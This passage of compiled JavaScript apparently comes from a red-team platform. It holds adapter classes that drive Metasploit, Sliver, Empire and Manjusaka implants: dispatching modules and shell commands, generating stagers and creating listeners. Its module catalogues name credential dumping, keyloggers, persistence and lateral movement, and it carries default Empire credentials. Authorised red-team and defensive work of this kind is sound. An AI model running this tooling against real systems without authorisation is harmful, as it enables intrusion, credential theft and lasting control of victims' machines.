        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  /**
   * Execute a Metasploit module (exploit/post/auxiliary) against a target.
   * This is separate from session-based dispatch — it launches a new module job.
   */
  async executeModule(params) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const client = await this.getClient();
      if (!client) throw new Error("No Metasploit connection");
      const result = await client.executeModule(
        params.moduleType,
        params.modulePath,
        params.options,
        params.payload
      );
      return {
        taskId: `msf-job-${result.job_id}`,
        framework: "metasploit",
        agentId: params.options.SESSION || "target",
        moduleId: `${params.moduleType}/${params.modulePath}`,
        status: "running",
        exitCode: -1,
        stdout: "",
        stderr: "",
        startedAt,
        metadata: { jobId: result.job_id, uuid: result.uuid }
      };
    } catch (err) {
      return {
        taskId: `msf-err-${Date.now()}`,
        framework: "metasploit",
        agentId: "target",
        moduleId: `${params.moduleType}/${params.modulePath}`,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async pollResult(taskId, agentId) {
    try {
      const client = await this.getClient();
      if (!client) throw new Error("No Metasploit connection");
      if (taskId.startsWith("msf-job-")) {
        const jobId = taskId.replace("msf-job-", "");
        const jobs = await client.listJobs();
        const isRunning = jobId in jobs;
        return {
          taskId,
          framework: "metasploit",
          agentId,
          moduleId: "",
          status: isRunning ? "running" : "success",
          exitCode: isRunning ? -1 : 0,
          stdout: isRunning ? "Job still running" : "Job completed",
          stderr: "",
          startedAt: (/* @__PURE__ */ new Date()).toISOString(),
          completedAt: isRunning ? void 0 : (/* @__PURE__ */ new Date()).toISOString()
        };
      }
      return {
        taskId,
        framework: "metasploit",
        agentId,
        moduleId: "",
        status: "success",
        exitCode: 0,
        stdout: "",
        stderr: "",
        startedAt: (/* @__PURE__ */ new Date()).toISOString(),
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    } catch (err) {
      return {
        taskId,
        framework: "metasploit",
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async killAgent(agentId) {
    try {
      const client = await this.getClient();
      if (!client) return false;
      await client.stopSession(agentId);
      return true;
    } catch {
      return false;
    }
  }
};
var SliverAdapter = class {
  constructor() {
    this.framework = "sliver";
  }
  get baseUrl() {
    return process.env.SLIVER_API_URL || "";
  }
  get token() {
    return process.env.SLIVER_API_TOKEN || "";
  }
  async sliverFetch(endpoint, options = {}) {
    if (!this.baseUrl) throw new Error("SLIVER_API_URL not configured");
    const url = `${this.baseUrl}${endpoint}`;
    const resp = await fetch(url, {
      ...options,
      headers: {
        "Authorization": `Bearer ${this.token}`,
        "Content-Type": "application/json",
        ...options.headers || {}
      }
    });
    if (!resp.ok) throw new Error(`Sliver API ${resp.status}: ${await resp.text()}`);
    return resp.json().catch(() => null);
  }
  async healthCheck() {
    try {
      const [version, sessions, beacons] = await Promise.all([
        this.sliverFetch("/version").catch(() => null),
        this.sliverFetch("/sessions").catch(() => []),
        this.sliverFetch("/beacons").catch(() => [])
      ]);
      const sessionCount = Array.isArray(sessions) ? sessions.length : 0;
      const beaconCount = Array.isArray(beacons) ? beacons.length : 0;
      return {
        framework: "sliver",
        connected: true,
        version: version?.version || "unknown",
        agentCount: sessionCount + beaconCount,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        details: { sessions: sessionCount, beacons: beaconCount }
      };
    } catch (err) {
      return {
        framework: "sliver",
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: err.message
      };
    }
  }
  async listAgents() {
    try {
      const [sessions, beacons] = await Promise.all([
        this.sliverFetch("/sessions").catch(() => []),
        this.sliverFetch("/beacons").catch(() => [])
      ]);
      const agents = [];
      if (Array.isArray(sessions)) {
        for (const s of sessions) {
          agents.push({
            id: s.ID || s.id,
            framework: "sliver",
            hostname: s.Hostname || s.hostname || "unknown",
            username: s.Username || s.username || "unknown",
            platform: (s.OS || s.os || "unknown").toLowerCase(),
            architecture: s.Arch || s.arch || "unknown",
            ipAddress: s.RemoteAddress || s.remote_address || "",
            status: "active",
            lastSeen: s.LastCheckin || (/* @__PURE__ */ new Date()).toISOString(),
            privileges: (s.Username || "").includes("root") || (s.Username || "").includes("SYSTEM") ? "system" : "user",
            transport: s.Transport || s.transport || "mtls",
            metadata: { type: "session", pid: s.PID || s.pid, name: s.Name || s.name }
          });
        }
      }
      if (Array.isArray(beacons)) {
        for (const b of beacons) {
          agents.push({
            id: b.ID || b.id,
            framework: "sliver",
            hostname: b.Hostname || b.hostname || "unknown",
            username: b.Username || b.username || "unknown",
            platform: (b.OS || b.os || "unknown").toLowerCase(),
            architecture: b.Arch || b.arch || "unknown",
            ipAddress: b.RemoteAddress || b.remote_address || "",
            status: this.beaconStatus(b),
            lastSeen: b.LastCheckin || (/* @__PURE__ */ new Date()).toISOString(),
            privileges: (b.Username || "").includes("root") || (b.Username || "").includes("SYSTEM") ? "system" : "user",
            transport: b.Transport || b.transport || "https",
            metadata: { type: "beacon", interval: b.Interval, jitter: b.Jitter, pid: b.PID }
          });
        }
      }
      return agents;
    } catch {
      return [];
    }
  }
  beaconStatus(b) {
    const lastCheckin = new Date(b.LastCheckin || b.last_checkin || 0).getTime();
    const interval = (b.Interval || 60) * 1e3;
    const missedCheckins = (Date.now() - lastCheckin) / interval;
    if (missedCheckins < 3) return "active";
    if (missedCheckins < 10) return "dormant";
    return "dead";
  }
  async getAgent(agentId) {
    const agents = await this.listAgents();
    return agents.find((a) => a.id === agentId) || null;
  }
  async searchModules(query) {
    const sliverCommands = [
      { id: "shell", framework: "sliver", name: "Shell", description: "Execute shell command", type: "command", platform: ["windows", "linux", "macos"] },
      { id: "execute", framework: "sliver", name: "Execute", description: "Execute a program", type: "command", platform: ["windows", "linux", "macos"] },
      { id: "execute-assembly", framework: "sliver", name: "Execute Assembly", description: "Execute .NET assembly in-memory", type: "command", platform: ["windows"], techniqueId: "T1059.001" },
      { id: "sideload", framework: "sliver", name: "Sideload", description: "Load and execute a shared library", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1574.002" },
      { id: "spawn-dll", framework: "sliver", name: "Spawn DLL", description: "Spawn a DLL in a sacrificial process", type: "command", platform: ["windows"], techniqueId: "T1055.001" },
      { id: "upload", framework: "sliver", name: "Upload", description: "Upload a file to target", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1105" },
      { id: "download", framework: "sliver", name: "Download", description: "Download a file from target", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1005" },
      { id: "screenshot", framework: "sliver", name: "Screenshot", description: "Take a screenshot", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1113" },
      { id: "ps", framework: "sliver", name: "Process List", description: "List running processes", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1057" },
      { id: "netstat", framework: "sliver", name: "Netstat", description: "List network connections", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1049" },
      { id: "ifconfig", framework: "sliver", name: "Ifconfig", description: "List network interfaces", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1016" },
      { id: "whoami", framework: "sliver", name: "Whoami", description: "Get current user", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1033" },
      { id: "getprivs", framework: "sliver", name: "Get Privileges", description: "Get current privileges", type: "command", platform: ["windows"], techniqueId: "T1078" },
      { id: "getsystem", framework: "sliver", name: "Get System", description: "Attempt privilege escalation to SYSTEM", type: "command", platform: ["windows"], techniqueId: "T1134" },
      { id: "pivots", framework: "sliver", name: "Pivots", description: "Manage pivots (TCP, named pipe)", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1090" },
      { id: "portfwd", framework: "sliver", name: "Port Forward", description: "Create port forwarding tunnel", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1090" },
      { id: "socks5", framework: "sliver", name: "SOCKS5 Proxy", description: "Start SOCKS5 proxy through implant", type: "command", platform: ["windows", "linux", "macos"], techniqueId: "T1090" },
      { id: "msf", framework: "sliver", name: "MSF Inject", description: "Inject Metasploit payload into process", type: "command", platform: ["windows", "linux"], techniqueId: "T1055" },
      { id: "psexec", framework: "sliver", name: "PsExec", description: "Lateral movement via PsExec", type: "command", platform: ["windows"], techniqueId: "T1021.002" },
      { id: "wmi", framework: "sliver", name: "WMI", description: "Execute via WMI", type: "command", platform: ["windows"], techniqueId: "T1047" }
    ];
    const q = query.toLowerCase();
    return sliverCommands.filter(
      (c) => c.name.toLowerCase().includes(q) || c.description.toLowerCase().includes(q) || c.id.includes(q) || c.techniqueId?.toLowerCase().includes(q)
    );
  }
  async getModule(moduleId) {
    const modules = await this.searchModules(moduleId);
    return modules.find((m) => m.id === moduleId) || null;
  }
  async dispatch(request) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const agent = await this.getAgent(request.agentId);
      if (!agent) throw new Error(`Agent ${request.agentId} not found`);
      const isBeacon = agent.metadata?.type === "beacon";
      const endpoint = isBeacon ? `/beacons/${request.agentId}/tasks` : `/sessions/${request.agentId}/commands`;
      const result = await this.sliverFetch(endpoint, {
        method: "POST",
        body: JSON.stringify({
          command: request.moduleId,
          args: request.options?.args || [],
          data: request.options?.data,
          timeout: request.timeout || 300
        })
      });
      const taskId = result?.TaskID || result?.task_id || `sliver-${Date.now()}`;
      return {
        taskId,
        framework: "sliver",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: isBeacon ? "pending" : "running",
        exitCode: -1,
        stdout: result?.Response || "",
        stderr: "",
        startedAt,
        metadata: { isBeacon, response: result }
      };
    } catch (err) {
      return {
        taskId: `sliver-err-${Date.now()}`,
        framework: "sliver",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async pollResult(taskId, agentId) {
    try {
      const result = await this.sliverFetch(`/tasks/${taskId}`);
      return {
        taskId,
        framework: "sliver",
        agentId,
        moduleId: result?.Command || "",
        status: result?.Completed ? "success" : "running",
        exitCode: result?.Err ? 1 : 0,
        stdout: result?.Response || "",
        stderr: result?.Err || "",
        startedAt: result?.CreatedAt || (/* @__PURE__ */ new Date()).toISOString(),
        completedAt: result?.Completed ? (/* @__PURE__ */ new Date()).toISOString() : void 0
      };
    } catch (err) {
      return {
        taskId,
        framework: "sliver",
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async killAgent(agentId) {
    try {
      await this.sliverFetch(`/sessions/${agentId}/kill`, { method: "POST" }).catch(() => this.sliverFetch(`/beacons/${agentId}/kill`, { method: "POST" }));
      return true;
    } catch {
      return false;
    }
  }
};
var EmpireAdapter = class {
  constructor() {
    this.framework = "empire";
    this.tokenCache = null;
  }
  get baseUrl() {
    return process.env.EMPIRE_BASE_URL || "";
  }
  get apiKey() {
    return process.env.EMPIRE_API_KEY || "";
  }
  async getToken() {
    if (this.apiKey) return this.apiKey;
    if (this.tokenCache && this.tokenCache.expiresAt > Date.now()) {
      return this.tokenCache.token;
    }
    const username = process.env.EMPIRE_USERNAME || "empireadmin";
    const password = process.env.EMPIRE_PASSWORD || "password123!";
    const resp = await fetch(`${this.baseUrl}/api/v2/admin/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password })
    });
    if (!resp.ok) throw new Error(`Empire auth failed: ${resp.status}`);
    const data = await resp.json();
    const token = data.token || data.access_token;
    this.tokenCache = { token, expiresAt: Date.now() + 3500 * 1e3 };
    return token;
  }
  async empireFetch(endpoint, options = {}) {
    if (!this.baseUrl) throw new Error("EMPIRE_BASE_URL not configured");
    const token = await this.getToken();
    const url = `${this.baseUrl}/api/v2${endpoint}`;
    const resp = await fetch(url, {
      ...options,
      headers: {
        "Authorization": `Bearer ${token}`,
        "Content-Type": "application/json",
        ...options.headers || {}
      }
    });
    if (!resp.ok) throw new Error(`Empire API ${resp.status}: ${await resp.text()}`);
    return resp.json().catch(() => null);
  }
  async healthCheck() {
    try {
      const [version, agents, listeners] = await Promise.all([
        this.empireFetch("/meta/version").catch(() => null),
        this.empireFetch("/agents").catch(() => ({ records: [] })),
        this.empireFetch("/listeners").catch(() => ({ records: [] }))
      ]);
      const agentList = agents?.records || agents || [];
      const listenerList = listeners?.records || listeners || [];
      return {
        framework: "empire",
        connected: true,
        version: version?.version || "5.x",
        agentCount: Array.isArray(agentList) ? agentList.length : 0,
        activeJobs: Array.isArray(listenerList) ? listenerList.length : 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        details: { listeners: Array.isArray(listenerList) ? listenerList.length : 0 }
      };
    } catch (err) {
      return {
        framework: "empire",
        connected: false,
        agentCount: 0,
        activeJobs: 0,
        lastChecked: (/* @__PURE__ */ new Date()).toISOString(),
        error: err.message
      };
    }
  }
  async listAgents() {
    try {
      const data = await this.empireFetch("/agents");
      const agents = data?.records || data || [];
      if (!Array.isArray(agents)) return [];
      return agents.map((a) => ({
        id: a.session_id || a.name || a.id?.toString() || "unknown",
        framework: "empire",
        hostname: a.hostname || a.host || "unknown",
        username: a.username || "unknown",
        platform: this.mapPlatform(a.os_details || a.language || ""),
        architecture: a.architecture || this.inferArch(a.os_details || ""),
        ipAddress: a.external_ip || a.internal_ip || a.host || "",
        status: this.mapAgentStatus(a),
        lastSeen: a.lastseen_time || a.checkin_time || (/* @__PURE__ */ new Date()).toISOString(),
        privileges: this.inferPrivileges(a),
        processId: a.process_id,
        processName: a.process_name,
        transport: a.listener || "http",
        metadata: {
          language: a.language,
          // powershell, python, csharp
          listener: a.listener,
          high_integrity: a.high_integrity,
          stale: a.stale,
          delay: a.delay,
          jitter: a.jitter,
          nonce: a.nonce
        }
      }));
    } catch {
      return [];
    }
  }
  mapPlatform(osDetails) {
    const os = osDetails.toLowerCase();
    if (os.includes("windows")) return "windows";
    if (os.includes("linux") || os.includes("ubuntu") || os.includes("centos")) return "linux";
    if (os.includes("macos") || os.includes("darwin")) return "macos";
    return "multi";
  }
  inferArch(osDetails) {
    const os = osDetails.toLowerCase();
    if (os.includes("x64") || os.includes("amd64") || os.includes("64-bit")) return "x64";
    if (os.includes("x86") || os.includes("32-bit")) return "x86";
    if (os.includes("arm")) return "arm64";
    return "x64";
  }
  mapAgentStatus(a) {
    if (a.stale === true) return "dormant";
    if (a.archived === true) return "dead";
    const lastSeen = new Date(a.lastseen_time || a.checkin_time || 0).getTime();
    const diffMin = (Date.now() - lastSeen) / 6e4;
    if (diffMin < 5) return "active";
    if (diffMin < 60) return "dormant";
    return "dead";
  }
  inferPrivileges(a) {
    if (a.high_integrity === true) return "admin";
    const username = (a.username || "").toLowerCase();
    if (username.includes("system") || username.includes("root") || username === "nt authority\\system") return "system";
    if (username.includes("admin")) return "admin";
    return "user";
  }
  async getAgent(agentId) {
    try {
      const data = await this.empireFetch(`/agents/${agentId}`);
      if (!data) return null;
      const agents = await this.listAgents();
      return agents.find((a) => a.id === agentId) || null;
    } catch {
      return null;
    }
  }
  async searchModules(query) {
    try {
      const data = await this.empireFetch(`/modules?query=${encodeURIComponent(query)}`);
      const modules = data?.records || data || [];
      if (!Array.isArray(modules)) return [];
      return modules.slice(0, 50).map((m) => ({
        id: m.id || m.name,
        framework: "empire",
        name: m.name,
        description: m.description || "",
        type: this.mapModuleType(m),
        platform: this.mapModulePlatforms(m),
        techniqueId: this.extractTechniqueId(m),
        tactic: this.extractTactic(m),
        rank: m.opsec_safe ? 400 : 300,
        options: m.options ? Object.fromEntries(
          Object.entries(m.options).map(([k, v]) => [k, {
            name: k,
            type: typeof v.Value === "boolean" ? "boolean" : "string",
            required: v.Required || false,
            default: v.Value,
            description: v.Description || ""
          }])
        ) : void 0
      }));
    } catch {
      return this.getBuiltinModules(query);
    }
  }
  mapModuleType(m) {
    const name = (m.name || m.id || "").toLowerCase();
    if (name.includes("collection")) return "post";
    if (name.includes("credentials") || name.includes("mimikatz")) return "post";
    if (name.includes("lateral_movement") || name.includes("psexec")) return "exploit";
    if (name.includes("privesc")) return "exploit";
    if (name.includes("persistence")) return "post";
    if (name.includes("situational_awareness") || name.includes("recon")) return "auxiliary";
    if (name.includes("exfiltration")) return "post";
    if (name.includes("management")) return "auxiliary";
    if (name.includes("trollsploit")) return "auxiliary";
    return "post";
  }
  mapModulePlatforms(m) {
    const lang = (m.language || "").toLowerCase();
    if (lang === "powershell" || lang === "csharp") return ["windows"];
    if (lang === "python") return ["linux", "macos"];
    return ["windows", "linux", "macos"];
  }
  extractTechniqueId(m) {
    if (m.techniques) {
      const techniques = Array.isArray(m.techniques) ? m.techniques : [m.techniques];
      return techniques[0] || void 0;
    }
    const name = (m.name || "").toLowerCase();
    const techniqueMap = {
      "mimikatz": "T1003.001",
      "kerberoast": "T1558.003",
      "dcsync": "T1003.006",
      "golden_ticket": "T1558.001",
      "psexec": "T1021.002",
      "wmi": "T1047",
      "invoke_smbexec": "T1021.002",
      "powerup": "T1574",
      "sherlock": "T1518.001",
      "bloodhound": "T1087.002",
      "keylogger": "T1056.001",
      "screenshot": "T1113",
      "clipboard": "T1115",
      "schtasks": "T1053.005",
      "registry": "T1547.001",
      "wmi_persistence": "T1546.003"
    };
    for (const [key, tech] of Object.entries(techniqueMap)) {
      if (name.includes(key)) return tech;
    }
    return void 0;
  }
  extractTactic(m) {
    if (m.tactics) {
      const tactics = Array.isArray(m.tactics) ? m.tactics : [m.tactics];
      return tactics[0] || void 0;
    }
    const name = (m.name || m.id || "").toLowerCase();
    if (name.includes("credentials") || name.includes("mimikatz") || name.includes("kerberoast")) return "credential-access";
    if (name.includes("lateral_movement") || name.includes("psexec") || name.includes("wmi")) return "lateral-movement";
    if (name.includes("privesc") || name.includes("powerup")) return "privilege-escalation";
    if (name.includes("persistence") || name.includes("schtasks") || name.includes("registry")) return "persistence";
    if (name.includes("collection") || name.includes("keylog") || name.includes("screenshot")) return "collection";
    if (name.includes("situational_awareness") || name.includes("recon")) return "discovery";
    if (name.includes("exfiltration")) return "exfiltration";
    if (name.includes("evasion")) return "defense-evasion";
    return void 0;
  }
  /**
   * Fallback built-in module list for when the API is unreachable.
   * Covers the most commonly used Empire modules.
   */
  getBuiltinModules(query) {
    const modules = [
      { id: "powershell/credentials/mimikatz/logonpasswords", framework: "empire", name: "Mimikatz LogonPasswords", description: "Execute Mimikatz to extract plaintext credentials from memory", type: "post", platform: ["windows"], techniqueId: "T1003.001", tactic: "credential-access" },
      { id: "powershell/credentials/mimikatz/dcsync", framework: "empire", name: "Mimikatz DCSync", description: "Perform DCSync to replicate AD credentials", type: "post", platform: ["windows"], techniqueId: "T1003.006", tactic: "credential-access" },
      { id: "powershell/credentials/mimikatz/golden_ticket", framework: "empire", name: "Mimikatz Golden Ticket", description: "Create a Kerberos golden ticket for persistence", type: "post", platform: ["windows"], techniqueId: "T1558.001", tactic: "credential-access" },
      { id: "powershell/credentials/mimikatz/silver_ticket", framework: "empire", name: "Mimikatz Silver Ticket", description: "Create a Kerberos silver ticket for service access", type: "post", platform: ["windows"], techniqueId: "T1558.002", tactic: "credential-access" },
      { id: "powershell/situational_awareness/network/bloodhound3", framework: "empire", name: "BloodHound", description: "Run BloodHound/SharpHound for AD enumeration", type: "auxiliary", platform: ["windows"], techniqueId: "T1087.002", tactic: "discovery" },
      { id: "powershell/situational_awareness/host/antivirusproduct", framework: "empire", name: "AV Product Check", description: "Enumerate installed antivirus products", type: "auxiliary", platform: ["windows"], techniqueId: "T1518.001", tactic: "discovery" },
      { id: "powershell/lateral_movement/invoke_psexec", framework: "empire", name: "Invoke-PsExec", description: "Lateral movement via PsExec", type: "exploit", platform: ["windows"], techniqueId: "T1021.002", tactic: "lateral-movement" },
      { id: "powershell/lateral_movement/invoke_wmi", framework: "empire", name: "Invoke-WMI", description: "Lateral movement via WMI", type: "exploit", platform: ["windows"], techniqueId: "T1047", tactic: "lateral-movement" },
      { id: "powershell/lateral_movement/invoke_smbexec", framework: "empire", name: "Invoke-SMBExec", description: "Lateral movement via SMB", type: "exploit", platform: ["windows"], techniqueId: "T1021.002", tactic: "lateral-movement" },
      { id: "powershell/lateral_movement/invoke_dcom", framework: "empire", name: "Invoke-DCOM", description: "Lateral movement via DCOM", type: "exploit", platform: ["windows"], techniqueId: "T1021.003", tactic: "lateral-movement" },
      { id: "powershell/privesc/powerup/allchecks", framework: "empire", name: "PowerUp AllChecks", description: "Run all PowerUp privilege escalation checks", type: "exploit", platform: ["windows"], techniqueId: "T1574", tactic: "privilege-escalation" },
      { id: "powershell/privesc/gpp", framework: "empire", name: "GPP Passwords", description: "Extract Group Policy Preference passwords", type: "exploit", platform: ["windows"], techniqueId: "T1552.006", tactic: "credential-access" },
      { id: "powershell/persistence/elevated/schtasks", framework: "empire", name: "Scheduled Task Persistence", description: "Create scheduled task for persistence", type: "post", platform: ["windows"], techniqueId: "T1053.005", tactic: "persistence" },
      { id: "powershell/persistence/elevated/registry", framework: "empire", name: "Registry Persistence", description: "Add registry run key for persistence", type: "post", platform: ["windows"], techniqueId: "T1547.001", tactic: "persistence" },
      { id: "powershell/persistence/elevated/wmi", framework: "empire", name: "WMI Persistence", description: "WMI event subscription persistence", type: "post", platform: ["windows"], techniqueId: "T1546.003", tactic: "persistence" },
      { id: "powershell/collection/screenshot", framework: "empire", name: "Screenshot", description: "Take a screenshot of the desktop", type: "post", platform: ["windows"], techniqueId: "T1113", tactic: "collection" },
      { id: "powershell/collection/keylogger", framework: "empire", name: "Keylogger", description: "Start a keylogger on the target", type: "post", platform: ["windows"], techniqueId: "T1056.001", tactic: "collection" },
      { id: "powershell/collection/clipboard_monitor", framework: "empire", name: "Clipboard Monitor", description: "Monitor clipboard contents", type: "post", platform: ["windows"], techniqueId: "T1115", tactic: "collection" },
      { id: "powershell/management/spawn", framework: "empire", name: "Spawn Agent", description: "Spawn a new Empire agent", type: "auxiliary", platform: ["windows"] },
      { id: "powershell/management/invoke_script", framework: "empire", name: "Invoke Script", description: "Execute a custom PowerShell script", type: "auxiliary", platform: ["windows"], techniqueId: "T1059.001" },
      { id: "powershell/credentials/invoke_kerberoast", framework: "empire", name: "Invoke-Kerberoast", description: "Request and crack service tickets", type: "post", platform: ["windows"], techniqueId: "T1558.003", tactic: "credential-access" },
      { id: "powershell/situational_awareness/network/get_domaincontroller", framework: "empire", name: "Get Domain Controller", description: "Enumerate domain controllers", type: "auxiliary", platform: ["windows"], techniqueId: "T1018", tactic: "discovery" },
      { id: "powershell/situational_awareness/network/get_domainuser", framework: "empire", name: "Get Domain Users", description: "Enumerate domain users", type: "auxiliary", platform: ["windows"], techniqueId: "T1087.002", tactic: "discovery" },
      { id: "powershell/situational_awareness/network/get_domaingroup", framework: "empire", name: "Get Domain Groups", description: "Enumerate domain groups", type: "auxiliary", platform: ["windows"], techniqueId: "T1069.002", tactic: "discovery" },
      { id: "python/collection/osx/screenshot", framework: "empire", name: "macOS Screenshot", description: "Take a screenshot on macOS", type: "post", platform: ["macos"], techniqueId: "T1113", tactic: "collection" },
      { id: "python/collection/linux/keylogger", framework: "empire", name: "Linux Keylogger", description: "Start a keylogger on Linux", type: "post", platform: ["linux"], techniqueId: "T1056.001", tactic: "collection" },
      { id: "python/privesc/linux/linux_priv_checker", framework: "empire", name: "Linux Priv Checker", description: "Check for privilege escalation vectors on Linux", type: "exploit", platform: ["linux"], techniqueId: "T1548", tactic: "privilege-escalation" },
      { id: "python/situational_awareness/network/port_scan", framework: "empire", name: "Port Scanner", description: "Scan for open ports on target hosts", type: "auxiliary", platform: ["linux", "macos"], techniqueId: "T1046", tactic: "discovery" },
      { id: "csharp/credentials/rubeus", framework: "empire", name: "Rubeus", description: "Kerberos abuse toolkit (ASREPRoast, Kerberoast, etc.)", type: "post", platform: ["windows"], techniqueId: "T1558", tactic: "credential-access" },
      { id: "csharp/credentials/seatbelt", framework: "empire", name: "Seatbelt", description: "Host survey and security audit tool", type: "auxiliary", platform: ["windows"], techniqueId: "T1082", tactic: "discovery" },
      { id: "csharp/lateral_movement/sharpwmi", framework: "empire", name: "SharpWMI", description: "C# WMI lateral movement", type: "exploit", platform: ["windows"], techniqueId: "T1047", tactic: "lateral-movement" }
    ];
    const q = query.toLowerCase();
    return modules.filter(
      (m) => m.name.toLowerCase().includes(q) || m.description.toLowerCase().includes(q) || m.id.toLowerCase().includes(q) || m.techniqueId?.toLowerCase().includes(q) || m.tactic?.toLowerCase().includes(q)
    );
  }
  async getModule(moduleId) {
    try {
      const data = await this.empireFetch(`/modules/${encodeURIComponent(moduleId)}`);
      if (!data) return null;
      return {
        id: data.id || data.name || moduleId,
        framework: "empire",
        name: data.name || moduleId,
        description: data.description || "",
        type: this.mapModuleType(data),
        platform: this.mapModulePlatforms(data),
        techniqueId: this.extractTechniqueId(data),
        tactic: this.extractTactic(data),
        rank: data.opsec_safe ? 400 : 300,
        options: data.options ? Object.fromEntries(
          Object.entries(data.options).map(([k, v]) => [k, {
            name: k,
            type: typeof v.Value === "boolean" ? "boolean" : "string",
            required: v.Required || false,
            default: v.Value,
            description: v.Description || ""
          }])
        ) : void 0
      };
    } catch {
      const builtins = this.getBuiltinModules(moduleId);
      return builtins.find((m) => m.id === moduleId) || null;
    }
  }
  async dispatch(request) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const taskPayload = {
        module: request.moduleId
      };
      if (request.options) {
        taskPayload.options = request.options;
      }
      const result = await this.empireFetch(`/agents/${request.agentId}/tasks/module`, {
        method: "POST",
        body: JSON.stringify(taskPayload)
      });
      const taskId = result?.id?.toString() || result?.taskID || `empire-${Date.now()}`;
      return {
        taskId,
        framework: "empire",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "running",
        exitCode: -1,
        stdout: "",
        stderr: "",
        startedAt,
        metadata: { taskData: result }
      };
    } catch (err) {
      return {
        taskId: `empire-err-${Date.now()}`,
        framework: "empire",
        agentId: request.agentId,
        moduleId: request.moduleId,
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  /**
   * Execute a shell command on an Empire agent.
   */
  async shellCommand(agentId, command) {
    const startedAt = (/* @__PURE__ */ new Date()).toISOString();
    try {
      const result = await this.empireFetch(`/agents/${agentId}/tasks/shell`, {
        method: "POST",
        body: JSON.stringify({ command })
      });
      const taskId = result?.id?.toString() || `empire-shell-${Date.now()}`;
      return {
        taskId,
        framework: "empire",
        agentId,
        moduleId: "shell",
        status: "running",
        exitCode: -1,
        stdout: "",
        stderr: "",
        startedAt,
        metadata: { command }
      };
    } catch (err) {
      return {
        taskId: `empire-shell-err-${Date.now()}`,
        framework: "empire",
        agentId,
        moduleId: "shell",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt,
        completedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async pollResult(taskId, agentId) {
    try {
      const data = await this.empireFetch(`/agents/${agentId}/tasks/${taskId}`);
      const completed = data?.status === "completed" || data?.output;
      return {
        taskId,
        framework: "empire",
        agentId,
        moduleId: data?.module || data?.command || "",
        status: completed ? "success" : "running",
        exitCode: completed ? 0 : -1,
        stdout: data?.output || data?.results || "",
        stderr: "",
        startedAt: data?.created_at || (/* @__PURE__ */ new Date()).toISOString(),
        completedAt: completed ? data?.updated_at || (/* @__PURE__ */ new Date()).toISOString() : void 0
      };
    } catch (err) {
      return {
        taskId,
        framework: "empire",
        agentId,
        moduleId: "",
        status: "error",
        exitCode: -1,
        stdout: "",
        stderr: err.message,
        startedAt: (/* @__PURE__ */ new Date()).toISOString()
      };
    }
  }
  async killAgent(agentId) {
    try {
      await this.empireFetch(`/agents/${agentId}`, { method: "DELETE" });
      return true;
    } catch {
      return false;
    }
  }
  // ─── Empire-Specific Operations ──────────────────────────────────────────
  /** List all active listeners */
  async listListeners() {
    try {
      const data = await this.empireFetch("/listeners");
      return data?.records || data || [];
    } catch {
      return [];
    }
  }
  /** Create a new listener */
  async createListener(params) {
    return this.empireFetch("/listeners", {
      method: "POST",
      body: JSON.stringify({
        name: params.name,
        template: params.template,
        options: {
          Host: params.host,
          Port: params.port.toString(),
          ...params.options
        }
      })
    });
  }
  /** List available stagers */
  async listStagers() {
    try {
      const data = await this.empireFetch("/stagers");
      return data?.records || data || [];
    } catch {
      return [];
    }
  }
  /** Generate a stager for agent deployment */
  async generateStager(params) {
    const result = await this.empireFetch("/stagers", {
      method: "POST",
      body: JSON.stringify({
        StagerName: params.template,
        Listener: params.listener,
        ...params.options
      })
    });
    return {
      output: result?.output || result?.Output || "",
      filename: result?.OutFile || void 0
    };
  }
  /** Get agent task results history */
  async getAgentResults(agentId) {
    try {
      const data = await this.empireFetch(`/agents/${agentId}/tasks`);
      return data?.records || data || [];
    } catch {
      return [];
    }
  }
};
var ManjusakaAdapter = class {
  constructor() {
    this.framework = "manjusaka";
  }
  static {
    /** @deprecated This adapter is deprecated and should not be used in production engagements */
    this.DEPRECATED = true;
  }
  get baseUrl() {
    return process.env.MANJUSAKA_API_URL || process.env.MANJUSAKA_BASE_URL || "";
  }
  get token() {
    return process.env.MANJUSAKA_API_KEY || process.env.MANJUSAKA_TOKEN || "";
  }
  async manjusakaFetch(endpoint, options = {}) {
    if (!this.baseUrl) throw new Error("MANJUSAKA_API_URL not configured");
    const url = `${this.baseUrl}${endpoint}`;
    const resp = await fetch(url, {
      ...options,
